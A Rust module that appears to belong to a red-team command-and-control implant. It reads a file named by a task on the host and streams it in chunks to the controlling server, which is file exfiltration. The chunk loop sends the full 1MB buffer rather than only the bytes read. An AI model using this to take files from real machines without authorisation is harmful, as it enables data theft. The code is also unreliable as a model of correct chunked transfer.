use super::{Dispatcher, Transport};
use anyhow::{anyhow, Result};
use pb::{
    c2::ReportFileRequest,
    eldritch::{File, FileMetadata},
};
use std::{io::Read, sync::mpsc::sync_channel};

#[cfg_attr(debug_assertions, derive(Debug))]
#[derive(Clone)]
pub struct ReportFileMessage {
    pub(crate) id: i64,
    pub(crate) path: String,
}

impl Dispatcher for ReportFileMessage {
    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
        // Configure Limits
        const CHUNK_SIZE: usize = 1024 * 1024; // 1MB Limit per chunk
        const MAX_FILE_SIZE: usize = CHUNK_SIZE * 1024; // 1GB Limit per file

        // Use a sync_channel to limit memory usage in case of network errors.
        // e.g. stop reading the file until more chunks can be sent.
        let (tx, rx) = sync_channel(1);

        // Spawn a new tokio task to read the file (in chunks)
        let task_id = self.id;
        let path = self.path.clone();
        let handle = tokio::spawn(async move {
            let result = || -> Result<()> {
                // Open file for reading
                let mut f = std::fs::File::open(&path)?;
                if f.metadata()?.len() > MAX_FILE_SIZE as u64 {
                    return Err(anyhow!("execeeded max file size"));
                }

                // Loop until we've finished reading the file
                loop {
                    let mut buffer = [0; CHUNK_SIZE];
                    let n = f.read(&mut buffer[..])?;

                    // Send chunk to the transport stream this will block until
                    // the transport stream is able to flush the data to the network
                    tx.send(ReportFileRequest {
                        task_id,
                        chunk: Some(File {
                            metadata: Some(FileMetadata {
                                path: path.clone(),

                                // TODO: File Metadata
                                owner: String::new(),
                                group: String::new(),
                                permissions: String::new(),

                                // Automatically derived by server
                                size: 0,
                                sha3_256_hash: String::new(),
                            }),
                            chunk: buffer.to_vec(),
                        }),
                    })?;

                    if n < 1 {
                        break Ok(());
                    }
                }
            };

            match result() {
                Ok(_) => {}
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to report file: {}", _err);
                }
            }
        });

        // Wait for completion
        let (_, join_err) = tokio::join!(transport.report_file(rx), handle);
        join_err?;

        Ok(())
    }
}
